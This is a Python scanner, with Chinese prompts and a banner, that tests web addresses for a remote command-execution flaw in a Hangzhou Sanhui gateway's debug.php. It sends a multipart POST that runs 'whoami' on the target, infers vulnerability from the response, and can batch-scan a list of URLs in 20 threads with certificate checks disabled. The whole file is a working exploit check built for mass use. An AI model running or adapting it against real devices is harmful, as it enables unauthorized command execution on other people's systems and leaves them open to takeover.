import concurrent.futures

import requests
import argparse

def cheeckVuln(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
        'Content-Type': 'multipart/form-data;boundary=----WebKitFormBoundaryAEiWTHP0DxJ7Uwmb'
    }
    vulnurl = url +'/debug.php'
    data="""
------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
Content-Disposition: form-data; name="comdtype"

1
------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
Content-Disposition: form-data; name="cmd"

whoami
------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
Content-Disposition: form-data; name="run"

------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb--    
    """

    try:
        res = requests.post(f"{url}/debug.php",headers=headers,data=data,timeout=5,verify=False)
        if res.status_code == 200 and res.text:
            if "daemon" in res.text:
                print(f"【+】{url}存在命令执行漏洞！！！")
            else:
                print(f"【-】{url}不存在漏洞")
    except Exception:
        print(f"【-】与{url}建立连接出现问题")


def banner():
    print("""
         _      _                              
    | |    | |                             
  __| | ___| |__  _   _  __ _ _ __ ___ ___ 
 / _` |/ _ \ '_ \| | | |/ _` | '__/ __/ _ \
| (_| |  __/ |_) | |_| | (_| | | | (_|  __/
 \__,_|\___|_.__/ \__,_|\__, |_|  \___\___|
                         __/ |             
                        |___/              


    """)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="这是杭州三汇网关 debug rce漏洞检测程序")
    parser.add_argument("-u", "--url", type=str, help="需要检测的目标URL")
    parser.add_argument("-f", "--file", type=str, help="需要批量检测的文件")
    args = parser.parse_args()

    if args.url:
        banner()
        cheeckVuln(args.url)
    elif args.file:
        banner()
        f =  open(args.file,'r')
        urls = f.read().splitlines()
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(cheeckVuln,urls)
    else:
        banner()
        print("-u,--url 指定需要检测的URL")
        print("-f,--file 指定需要批量检测的文件")


